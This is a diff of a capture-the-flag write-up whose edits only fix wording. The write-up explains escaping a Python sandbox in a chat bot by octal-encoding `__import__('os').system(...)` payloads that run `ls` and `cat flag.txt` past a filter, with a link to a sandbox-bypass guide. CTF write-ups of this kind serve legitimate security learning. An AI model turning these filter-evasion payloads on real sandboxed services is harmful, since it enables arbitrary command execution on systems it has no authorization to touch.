@@ -174,11 +174,11 @@ Based on the helpful message, I surmised that `ADMIN_ROLE` was simply `admin` an
 
 Attempting the obvious, issuing commands like `!add import('os').system('whoami')` were filtered by the input sanitization list and bot responded with `No shells are allowed`.
 
-Some googling later, I found [this page on bypassing pyjails](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes), the section on [eval-ing Python code](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#eval-ing-python-code) was most helpful. The first thin I tried that worked was the octal encoding of `__import__('os').system('ls')`
+Some googling later, I found [this page on bypassing pyjails](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes), the section on [eval-ing Python code](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#eval-ing-python-code) was most helpful. The first thing I tried that worked was the octal encoding of `__import__('os').system('ls')`
 
 `!add \137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51`
 
-Progress! Now changing the Python command to `__import__('os').system('cat flag.txt')` and encoding in octal I can issue
+Progress! Now changing the Python command to `__import__('os').system('cat flag.txt')` and encoding in octal I can issue the command
 
 `!add \137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\143\141\164\40\146\154\141\147\56\164\170\164\47\51` 
 
